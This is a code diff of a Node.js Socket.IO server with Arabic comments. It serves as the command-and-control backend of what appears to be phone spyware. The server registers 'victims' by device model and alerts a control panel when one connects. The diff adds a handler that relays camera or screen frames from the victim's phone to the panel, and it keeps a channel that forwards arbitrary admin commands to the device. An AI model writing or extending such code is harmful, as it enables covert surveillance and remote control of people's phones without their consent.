@@ -1,38 +1,34 @@
 const express = require('express');
-const path = require('path'); // مكتبة المسارات
+const path = require('path');
 const app = express();
 const http = require('http').createServer(app);
 const io = require('socket.io')(http, {
-    cors: { origin: "*", methods: ["GET", "POST"] },
+    cors: { origin: "*" },
     maxHttpBufferSize: 1e8 
 });
 
-// هذا السطر هو الحل: يرسل ملف index.html عندما تفتح الرابط
 app.get('/', (req, res) => {
     res.sendFile(path.join(__dirname, 'index.html'));
 });
 
-let victims = {};
-
 io.on('connection', (socket) => {
-    console.log('[!] اتصال جديد');
+    console.log('[!] جهاز متصل');
 
+    // استقبال التبليغ
     socket.on('victim_online', (data) => {
-        victims[socket.id] = { id: socket.id, model: data.model };
-        console.log(`[+] ضحية متصلة: ${data.model}`);
-        io.emit('new_victim_alert', victims[socket.id]);
+        socket.broadcast.emit('new_victim_alert', { id: socket.id, model: data.model });
     });
 
+    // تمرير فريمات الكاميرا أو الشاشة للوحة التحكم
+    socket.on('video_frame', (frame) => {
+        socket.broadcast.emit('display_frame', { frame: frame });
+    });
+
+    // تمرير الأوامر من لوحة التحكم للهاتف
     socket.on('admin_command', (data) => {
         socket.broadcast.emit(data.command, data);
-    });
-
-    socket.on('disconnect', () => {
-        delete victims[socket.id];
     });
 });
 
 const PORT = process.env.PORT || 8080;
-http.listen(PORT, '0.0.0.0', () => {
-    console.log(`Server is running on port ${PORT}`);
-});
+http.listen(PORT, '0.0.0.0', () => console.log(`Server on ${PORT}`));
